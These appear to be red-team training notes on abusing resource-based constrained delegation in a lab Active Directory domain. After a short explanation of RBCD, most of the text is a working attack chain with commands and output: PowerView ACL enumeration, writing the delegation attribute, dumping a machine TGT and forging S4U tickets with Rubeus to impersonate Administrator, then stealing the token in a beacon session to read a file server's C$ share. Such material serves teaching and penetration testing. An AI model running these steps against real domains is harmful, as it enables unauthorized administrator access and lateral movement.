
Constrained delegation is set on a front-end service and defines the back-end service(s) to which it can delegate to.  Modifying the msDS-AllowedToDelegateTo attribute of a service account (user or computer) requires the [SeEnableDelegationPrivilege](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/enable-computer-and-user-accounts-to-be-trusted-for-delegation) user-right assignment on domain controllers, which is only assigned to enterprise and domain admins.  Microsoft saw this as a problem because the service administrators had no useful way of knowing which front-end services delegated to resources that they were responsible for.

Windows 2012 introduced yet another form of delegation, called resource-based constrained delegation (often shorted to RBCD), which puts delegation control into the hands of the service administrators (e.g. it no longer requires SeEnableDelegationPrivilege to configure).  Now, instead of a front-end service dictating to which back-end services it can delegate to; it's the back-end service that controls which front-end services can delegate to it.

This is controlled by defining the front-end service account(s) in the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute of the service account running the back-end service.  The only privilege required is write access to this attribute, which will typically be granted to an appropriate domain group via the Delegation of Control Wizard.

![[Pasted image 20250722105219.png]]

An admin with these delegated rights can then add the desired RBCD entries using the RSAT PowerShell cmdlets.

```powershell
$front = Get-ADComputer -Identity 'lon-ws-1'
$back = Get-ADComputer -Identity 'lon-fs-1'

Set-ADComputer -Identity $back -PrincipalsAllowedToDelegateToAccount $front
```

> Abusing RBCD is not the same as with the other flavours of delegation, in that compromising the front-end service will not lead to a compromise of the back-end service.  However, an adversary can leverage RBCD to gain access to any computer if the following conditions are met:

- They have write access to the msDS-AllowedToActOnBehalfOfOtherIdentity attribute of a computer object. 
    
- They have control of another principal that has an SPN set.

> It's much easier to enumerate and abuse RBCD through a SOCKS proxy.  In the examples below, I'm using explicit plaintext credentials to authenticate.

> [!NOTE] **NOTE**
> You're essentially first configuring RBCD and then abusing it after

### WriteProperty

To find instances where write access has been granted to this specific attribute, we first need its GUID.  Every GUID is [documented](https://learn.microsoft.com/en-us/windows/win32/adschema/attributes-all) so we can simply scroll down to 'ms-DS-Allowed-To-Act-On-Behalf-Of-Other-Identity' and discover that its GUID is `3f78c3e5-f79a-46bd-a0b8-9d18116ddc79`.

The following PowerView query will fetch every computer in the domain and then reads each ACL in their DACL.  It only print results where the AceType equals the GUID for the msDS-AllowedToActOnBehalfOfOtherIdentity attribute, and the Right is WriteProperty.

```powershell
PS C:\Users\Attacker> ipmo C:\Tools\PowerSploit\Recon\PowerView.ps1
PS C:\Users\Attacker> $Cred = Get-Credential CONTOSO\rsteel
PS C:\Users\Attacker> Get-DomainComputer -Server 10.10.120.1 -Credential $Cred | Get-DomainObjectAcl -Server 10.10.120.1 -Credential $Cred | ? { $_.ObjectAceType -eq '3f78c3e5-f79a-46bd-a0b8-9d18116ddc79' -and $_.ActiveDirectoryRights -Match 'WriteProperty' } | select ObjectDN,SecurityIdentifier

ObjectDN                                        SecurityIdentifier
--------                                        ------------------
CN=LON-WS-1,OU=Member Servers,DC=contoso,DC=com S-1-5-21-3926355307-1661546229-813047887-1107
CN=LON-FS-1,OU=Member Servers,DC=contoso,DC=com S-1-5-21-3926355307-1661546229-813047887-1107
```

This output shows that 'something' with the SID of `S-1-5-21-3926355307-1661546229-813047887-1107` has the privilege we're looking for on both _lon-ws-1_ and _lon-fs-1_.  We can search through the users and groups in Active Directory to find to which this SID belongs.

```powershell
PS C:\Users\Attacker> Get-ADGroup -Filter 'objectsid -eq "S-1-5-21-3926355307-1661546229-813047887-1107"' -Server 10.10.120.1 -Credential $Cred

DistinguishedName : CN=Server Admins,CN=Users,DC=contoso,DC=com
GroupCategory     : Security
GroupScope        : Global
Name              : Server Admins
ObjectClass       : group
ObjectGUID        : 5ceea890-d8b7-47f3-918f-f6d3d040d70a
SamAccountName    : Server Admins
SID               : S-1-5-21-3926355307-1661546229-813047887-1107
```

This means that any member of the 'Server Admins' group can modify the attribute on these two computers.

>In the scenario outlined above, the privilege has been properly applied by granting it only on the relevant property.  However, you may see instances where the privilege is granted in more egregious ways, such as a GenericWrite or GenericAll on an entire object.  You will therefore have to take this into account when looking for these DACL abuse primitives.

The other requirement for RBCD abuse to work is access to an account that has an SPN set.  This is because all delegation, whether it be unconstrained, constrained, or resource-based, can only be configured on accounts that have an SPN.  This makes some amount of sense since an SPN is fundamental to how Kerberos works.

- Other computer accounts can be used if you have elevated privileges to SYSTEM anywhere, as every computer has a default set of SPNs such as HOST, RestrictedKrbHost, TERMSRV, and WSMAN.
    
- Service accounts can be used if you have obtained their credentials through an attack such as [kerberoasting](https://www.zeropointsecurity.co.uk/path-player?courseid=red-team-ops&unit=67851a86ba9789af1107f5f9).
    
- If you don't have any of the above, a last ditch attempt can be to add your own computer object to the domain.  Active Directory contains an attribute called `msDS-MachineAccountQuota` which controls the number of computer accounts that a user is allowed to create in the domain (yes, even standard domain users).  This is 10 by default.  Tools such as [StandIn](https://github.com/FuzzySecurity/StandIn) can create these fake computer objects via LDAP.

### The attack

```powershell
PS C:\Users\Attacker> Get-ADComputer -Filter * -Properties PrincipalsAllowedToDelegateToAccount -Server 10.10.120.1 -Credential $Cred | select Name,PrincipalsAllowedToDelegateToAccount

Name        PrincipalsAllowedToDelegateToAccount
----        ------------------------------------
LON-DC-1    {}
LON-WS-1    {}
LON-FS-1    {CN=LON-WS-1,OU=Member Servers,DC=contoso,DC=com}
LON-WKSTN-1 {}
LON-WKSTN-2 {}
```

>An AD property collection can only contain values of the same type.  Since _lon-fs-1_ already contains _lon-ws-1_, which is a computer account, we're not able to add a user account, such as _mssql_svc_ to it.  Since we don't want to remove lon-ws-1 (although we could), this pretty much forces us to use a computer account.

To add a computer that we have SYSTEM on, such as _lon-wkstn-1_, we can do:

```powershell
PS C:\Users\Attacker> $ws1 = Get-ADComputer -Identity 'lon-ws-1' -Server 10.10.120.1 -Credential $Cred
PS C:\Users\Attacker> $wkstn1 = Get-ADComputer -Identity 'lon-wkstn-1' -Server 10.10.120.1 -Credential $Cred
PS C:\Users\Attacker> Set-ADComputer -Identity 'lon-fs-1' -PrincipalsAllowedToDelegateToAccount $ws1,$wkstn1 -Server 10.10.120.1 -Credential $Cred
```

Now if we read the property back, we'll see our entry has been added (without overwriting the existing one).

```powershell
PS C:\Users\Attacker> Get-ADComputer -Identity 'lon-fs-1' -Properties PrincipalsAllowedToDelegateToAccount -Server 10.10.120.1 -Credential $Cred | select Name,PrincipalsAllowedToDelegateToAccount

Name     PrincipalsAllowedToDelegateToAccount
----     ------------------------------------
LON-FS-1 {CN=LON-WS-1,OU=Member Servers,DC=contoso,DC=com, CN=LON-WKSTN-1,OU=Workstations,DC=contoso,DC=com}
```

To gain access to _lon-fs-1_, we need to extract or request a TGT for the principal we just added, and then perform the S4U steps through Rubeus.

```powershell
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0x3e7 /service:krbtgt /nowrap

[*] Target service  : krbtgt
[*] Target LUID     : 0x3e7
[*] Current LUID    : 0x152a73

  UserName                 : LON-WKSTN-1$
  Domain                   : CONTOSO
  LogonId                  : 0x3e7
  UserSID                  : S-1-5-18
  AuthenticationPackage    : Negotiate
  LogonType                : 0
  LogonTime                : 21/02/2025 06:15:36
  LogonServer              : 
  LogonServerDNSDomain     : contoso.com
  UserPrincipalName        : LON-WKSTN-1$@contoso.com


    ServiceName              :  krbtgt/CONTOSO.COM
    ServiceRealm             :  CONTOSO.COM
    UserName                 :  LON-WKSTN-1$ (NT_PRINCIPAL)
    UserRealm                :  CONTOSO.COM
    StartTime                :  21/02/2025 14:17:54
    EndTime                  :  22/02/2025 00:16:11
    RenewTill                :  28/02/2025 14:16:11
    Flags                    :  name_canonicalize, pre_authent, renewable, forwardable
    KeyType                  :  aes256_cts_hmac_sha1
    Base64(key)              :  Gv0JODuazH1s79IqvftcBcxr8zo131LNay3BM0xnPcw=
    Base64EncodedTicket   :

      doIFr[...snip...]kNPTQ==
```

```powershell	  
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user:LON-WKSTN-1$ /impersonateuser:Administrator /msdsspn:cifs/lon-fs-1 /ticket:doIFr[...snip...]kNPTQ== /nowrap

[*] Action: S4U

[*] Building S4U2self request for: 'LON-WKSTN-1$@CONTOSO.COM'
[*] Using domain controller: lon-dc-1.contoso.com (10.10.120.1)
[*] Sending S4U2self request to 10.10.120.1:88
[+] S4U2self success!
[*] Got a TGS for 'Administrator' to 'LON-WKSTN-1$@CONTOSO.COM'
[*] base64(ticket.kirbi):

      doIF+[...snip...]4tMSQ=

[*] Impersonating user 'Administrator' to target SPN 'cifs/lon-fs-1'
[*] Building S4U2proxy request for service: 'cifs/lon-fs-1'
[*] Using domain controller: lon-dc-1.contoso.com (10.10.120.1)
[*] Sending S4U2proxy request to domain controller 10.10.120.1:88
[+] S4U2proxy success!
[*] base64(ticket.kirbi) for SPN 'cifs/lon-fs-1':

      doIGh[...snip...]nMtMQ==
```


```powershell
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:CONTOSO.COM /username:Administrator /password:FakePass /ticket:doIGh[...snip...]nMtMQ==

[*] Using CONTOSO.COM\Administrator:FakePass

[*] Showing process : False
[*] Username        : Administrator
[*] Domain          : CONTOSO.COM
[*] Password        : FakePass
[+] Process         : 'C:\Windows\System32\cmd.exe' successfully created with LOGON_TYPE = 9
[+] ProcessID       : 4568
[+] Ticket successfully imported!
[+] LUID            : 0x1355200
```


```powershell
beacon> steal_token 4568
beacon> ls \\lon-fs-1\c$

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     01/23/2025 15:44:52   $Recycle.Bin
          dir     01/23/2025 13:57:51   $WinREAgent
          dir     01/23/2025 13:47:37   Documents and Settings
          dir     02/20/2025 10:37:21   Files
          dir     05/08/2021 09:20:24   PerfLogs
          dir     01/23/2025 15:46:17   Program Files
          dir     01/23/2025 15:46:18   Program Files (x86)
          dir     01/24/2025 14:21:18   ProgramData
          dir     01/23/2025 13:47:43   Recovery
          dir     01/24/2025 14:18:02   System Volume Information
          dir     01/24/2025 14:17:49   Users
          dir     01/24/2025 13:34:02   Windows
 12kb     fil     02/21/2025 06:15:31   DumpStack.log.tmp
 1gb      fil     02/21/2025 06:15:31   pagefile.sys
```